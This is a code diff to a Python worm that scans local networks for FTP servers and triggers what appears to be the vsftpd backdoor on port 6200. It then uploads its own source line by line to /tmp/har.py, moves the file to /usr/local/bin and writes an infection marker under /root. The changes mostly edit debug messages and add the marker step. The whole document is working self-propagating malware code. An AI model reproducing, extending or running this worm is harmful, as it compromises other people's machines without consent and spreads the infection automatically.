@@ -51,13 +51,13 @@ def scan_networks(adapters):
         ip_address = '{}/{}'.format(adapter.ip, adapter.network_prefix)
 
         if DEBUG:
-            debug_message('[+] Preparing to scan network on: {}'.format(adapter.nice_name))
-            debug_message('[+] Calculating network based on ip {}'.format(ip_address))
+            debug_message('[*] Preparing to scan network on: {}'.format(adapter.nice_name))
+            debug_message('[*] Calculating network based on ip {}'.format(ip_address))
 
         # Get the network name from adapter ip
         network = netaddr.IPAddress(netaddr.IPNetwork(ip_address).first)
 
-        debug_message('[+] Found network {} for ip {} with CIDR {}'.format(network, adapter.ip, adapter.network_prefix))
+        debug_message('[*] Found network {} for ip {} with CIDR {}'.format(network, adapter.ip, adapter.network_prefix))
 
         # Runs the following nmap command: nmap -sV -PN -T5 -p 21 <ip-address>
         result = scanner.scan(hosts='{}/{}'.format(network, adapter.network_prefix), ports='21', arguments='-sV -PN -T5')
@@ -76,7 +76,7 @@ def scan_networks(adapters):
         if len(nodes) > 0:
             targets += nodes
 
-        debug_message('[+] Found {} target(s)'.format(len(targets)))
+        debug_message('[*] Found {} target(s)'.format(len(targets)))
     return targets
 
 
@@ -94,6 +94,7 @@ def exploit(targets):
             ftp.send(b'PASS please\n')
             time.sleep(2)
             ftp.close()
+            debug_message('[*] Backdoor on port 6200 triggered for host {}'.format(target))
         except Exception as e:
             debug_message('[*] Unable to successfully trigger backdoor. Exception: {}'.format(e))
 
@@ -107,10 +108,21 @@ def exploit(targets):
             backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             backdoor.connect((target, 6200))
 
+            # The following does not work for some reason ...
+            # debug_message('[*] Looking to see if host was previously infected')
+            # command = str.encode('cat /root/.harpi3s 2>&1')
+            # backdoor.send(command)
+
+            # response = backdoor.recv(1024).decode('utf-8')
+            # debug_message(response, sep='')
+
             for line in get_self():
                 command = str.encode('echo "{}" >> /tmp/har.py\n'.format(line))
                 backdoor.send(command)
-                time.sleep(1)
+                debug_message('[*] Uploading payload ...')
+
+            command = str.encode('md5sum /tmp/har.py > /root/.harpi3s')
+            backdoor.send(command)
 
             command = str.encode('mv /tmp/har.py /usr/local/bin\n'.format(line))
             backdoor.send(command)
@@ -129,6 +141,7 @@ def exploit(targets):
 
             backdoor.close()
         except Exception as e:
+            debug_message('[!] Failed to connect to backdoor on {}:6200'.format(target))
             debug_message(e)
 
 
